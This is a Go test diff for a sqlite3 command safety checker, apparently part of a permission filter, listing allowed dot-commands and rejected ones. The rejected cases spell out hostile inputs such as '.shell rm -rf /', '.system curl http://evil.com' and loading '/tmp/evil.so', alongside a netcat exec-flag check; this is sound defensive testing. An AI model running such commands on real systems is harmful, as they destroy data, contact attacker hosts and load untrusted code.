@@ -193,6 +193,44 @@ func TestIsSqliteSafe_NormalizesQuotedKeywords(t *testing.T) {
 	}
 }
 
+func TestIsSqliteSafe_SafeDotCommands(t *testing.T) {
+	safe := [][]string{
+		{"sqlite3", "db.sqlite", ".tables"},
+		{"sqlite3", "db.sqlite", ".schema"},
+		{"sqlite3", "db.sqlite", ".headers", "on"},
+		{"sqlite3", "db.sqlite", ".mode", "csv"},
+		{"sqlite3", "db.sqlite", ".databases"},
+		{"sqlite3", "db.sqlite", ".indices"},
+		{"sqlite3", "db.sqlite", ".dbinfo"},
+		{"sqlite3", "db.sqlite", ".fullschema"},
+	}
+	for _, fields := range safe {
+		if !isSqliteSafe(fields) {
+			t.Errorf("expected %v to be safe", fields)
+		}
+	}
+}
+
+func TestIsSqliteSafe_DangerousDotCommands(t *testing.T) {
+	dangerous := [][]string{
+		{"sqlite3", "db.sqlite", ".shell", "rm", "-rf", "/"},
+		{"sqlite3", "db.sqlite", ".system", "curl", "http://evil.com"},
+		{"sqlite3", "db.sqlite", ".output", "/tmp/dump.sql"},
+		{"sqlite3", "db.sqlite", ".import", "malicious.csv", "users"},
+		{"sqlite3", "db.sqlite", ".load", "/tmp/evil.so"},
+		{"sqlite3", "db.sqlite", ".read", "/tmp/evil.sql"},
+		{"sqlite3", "db.sqlite", ".save", "/tmp/copy.db"},
+		{"sqlite3", "db.sqlite", ".restore", "main", "/tmp/evil.db"},
+		{"sqlite3", "db.sqlite", ".clone", "/tmp/copy.db"},
+		{"sqlite3", "db.sqlite", ".unknown_command"},
+	}
+	for _, fields := range dangerous {
+		if isSqliteSafe(fields) {
+			t.Errorf("expected %v to be unsafe", fields)
+		}
+	}
+}
+
 func TestIsNcSafe_RejectsExecFlags(t *testing.T) {
 	if isNcSafe([]string{"nc", "-ze", "example.com", "80"}) {
 		t.Fatal("expected combined exec flags to make nc unsafe")
